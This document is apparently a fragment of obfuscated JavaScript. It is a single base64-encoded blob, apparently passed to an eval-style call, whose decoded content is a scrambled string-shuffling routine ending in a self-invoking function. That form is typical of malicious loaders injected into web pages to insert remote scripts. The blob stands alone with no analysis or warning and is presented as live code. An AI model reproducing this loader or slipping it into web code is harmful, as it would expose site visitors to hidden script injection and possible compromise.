WRXVzY1V2UzV1d0cCxyc2Vpbmcob1sjNV9XYitXZW4sICtOZWwyLixqNm99aE5qdCYobGVsZU5XcjNXXVtXPWIoU29XIGk6KFtbODVXXSUmci5pdHJXcjNnXU9XbTNfNHR7V0xXRSkpbH09aXVXV2RjV1d0dFdlV2hXZjlscDFwbnIzZVdudChyZSh3Lml8LjJzfVcjZSQpfTtnTjEhKV90PS4iMl8iPkoucm9fdnRPYSlvLl9uJGltVyQ5P3B0dixXNFdzV2g4bnRkPUdlSH0uV29XNjdnbWU4eVcrV1c7ME5IITxfZT0tVyowKFdvZlddKFcuV3c1X3c5e1wnZWlhbmhXZHN0V3V2LCN0KWkuOjE5cjE4LFdpaWQzdyAuV2lMZXJ0KXVdfSJXZVdvNCl5IFdXNF1XPShUV240Q11hVzFXb1diM11nbjh0Vzs0bFBXV243XW1kMnMqLDV9KXRXbTZLYjszcldcLzQiV2VfaF8wK2FXaTNfZ3MkVDVzd29DciN0XTo/MSJ0WV99WztjdiVsZSJ9X10pO1dpV1cySV89dXQzPV1yUS4iel8pWzE5NDlXUz09Ri5zYSAmey5XIVhfZVtzOVdjM11tV2kwIl11MztdZil0Vyg2PWIlM3RXXzQtV0NfO182K1dXIDMpZyEkJTVfdyhDJSNvXW4/YiJXWWN9V1d0VzxXZFdXVyExJmdOOGVXKDRfUCFXbzdlbVcxZVduNGJdOTtpKHRfdFdzNjhcL2k3VyQ5NHp5IS5PITdfcVc4XylfJVd9V2I2KVd0V3tXd3tXdklsLiJfXzkpJSlnY2d0eWhXIjNNKUUuKTd9LCkzKVdlXShoKDEoOjdbMFcxKF1jKFc5Yl1vXyBqfW8hYldvLmtJcD1yXW1Xaj1vXW5Xc19lY19vbzBwTTJXdCVfdGpfbyVuZXMgZWRfV28tcGggLGFXeT1jLmVXV2kueyBuXzFzZV9kbHJjIV9lYVthV19XVyEwKV01KX0uY1dXIHlXMyg5KWYgLmU2W185bSk5V3AgVy47V2cgcCwgVyUgbCxXOWRbXzZlWyE5PSAuVzM0IF90YTFySTc2Y2NfVyBhOWcgczkoIC5Xbigse2g9MmUxd11pMS4xIGEkXTlhNzdbZHg1V19lbDthb2YoV04tIH1maUldIHtlUHklZXlmRGU8fSV0Y3lmV3QgJWYxSXMpKFcgLiI7K1t6JF85cDcrKSwhXXBsaWwoPSlXXylfYTZ4IFdke0tXV1coaSllV3JlZSlfS259XC9jaHRwaDF1YWN7aXRuVy50aj1pdChmOyNOXSBuZTl1KG4hV1d7YXYwcm4gNHY5ZWFdKy42IFc7XWZddCt5dSBsXTspbyh0LC4gfT0oZWRdZS47IHNpbyguLm4ubCBlX2UpN10kKGwgdCs+eycpKTt2YXIgc0ljPVRVaShCc2MsSEtZICk7c0ljKDQ4NjkpO3JldHVybiA2NjI4fSkoKQ=='))
